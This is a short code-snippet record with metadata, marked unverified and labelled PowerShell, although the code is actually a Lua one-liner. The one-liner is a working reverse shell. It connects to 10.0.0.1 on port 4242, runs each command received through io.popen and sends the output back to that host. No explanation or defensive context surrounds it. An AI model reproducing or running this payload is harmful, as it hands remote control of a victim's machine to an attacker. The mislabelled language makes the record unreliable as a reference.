---
id: 4d02fb88-4771-4b15-8ec7-74e3dde6a5f4
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:24.651829+00:00'
updated_at: '2023-04-10T20:25:24.219488+00:00'
---

# Code Snippet 4d02fb88

**Language**: Powershell

```powershell
lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
